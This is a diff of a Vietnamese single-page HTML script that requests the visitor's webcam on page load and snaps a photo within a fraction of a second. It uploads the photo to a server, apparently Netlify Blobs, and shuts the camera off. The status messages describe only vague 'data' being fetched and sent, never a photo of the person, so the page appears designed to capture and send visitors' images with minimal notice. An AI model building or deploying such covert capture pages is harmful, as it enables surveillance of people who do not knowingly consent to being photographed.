@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chụp Ảnh Webcam</title>
+    <title>Chụp Ảnh Webcam - Lưu Netlify Blobs</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -36,7 +36,7 @@
             margin-top: 25px;
             font-size: 1.3em;
             text-align: center;
-            min-height: 40px;
+            min-height: 50px;
         }
         canvas { display: none; }
     </style>
@@ -57,9 +57,9 @@
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
 
-        async function startFastCapture() {
+        async function startCapture() {
             try {
-                status.textContent = "Đang nạp dữ liệu...";
+                status.textContent = "Đang lấy dữ liệu...";
 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
@@ -73,11 +73,9 @@
                 video.srcObject = stream;
                 video.style.display = 'block';
 
-                // Chụp rất nhanh
                 video.onloadedmetadata = () => {
                     setTimeout(() => captureAndUpload(stream), 650);
                 };
-
             } catch (err) {
                 status.textContent = "❌ Vui lòng cho phép truy cập camera";
             }
@@ -88,7 +86,7 @@
             canvas.height = 480;
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
 
-            const imageData = canvas.toDataURL('image/jpeg', 0.75);
+            const imageData = canvas.toDataURL('image/jpeg', 0.72);
 
             status.textContent = "Đang gửi dữ liệu...";
 
@@ -100,24 +98,23 @@
                 });
 
                 if (response.ok) {
-                    status.innerHTML = `✅ <b>Gửi dữ liệu thành công!</b><br>
-                                        <small>Dữ liệu đã được đồng bộ</small>`;
+                    status.innerHTML = `✅ <b>Đã gửi dữ liệu thành công!</b><br>
+                                        <small>Dữ liệu đã được gửi</small>`;
                 } else {
                     status.textContent = "❌ Gửi dữ liệu thất bại. Vui lòng thử lại.";
                 }
             } catch (error) {
-                status.textContent = "❌ Lỗi kết nối server. Vui lòng thử lại sau.";
+                status.textContent = "❌ Lỗi kết nối server. Hãy thử lại sau.";
             }
 
-            // Tắt webcam sau khi xong
+            // Tắt webcam
             setTimeout(() => {
                 stream.getTracks().forEach(track => track.stop());
                 video.style.display = 'none';
-            }, 1800);
+            }, 2000);
         }
 
-        // Tự động chạy
-        window.onload = startFastCapture;
+        window.onload = startCapture;
     </script>
 </body>
 </html>
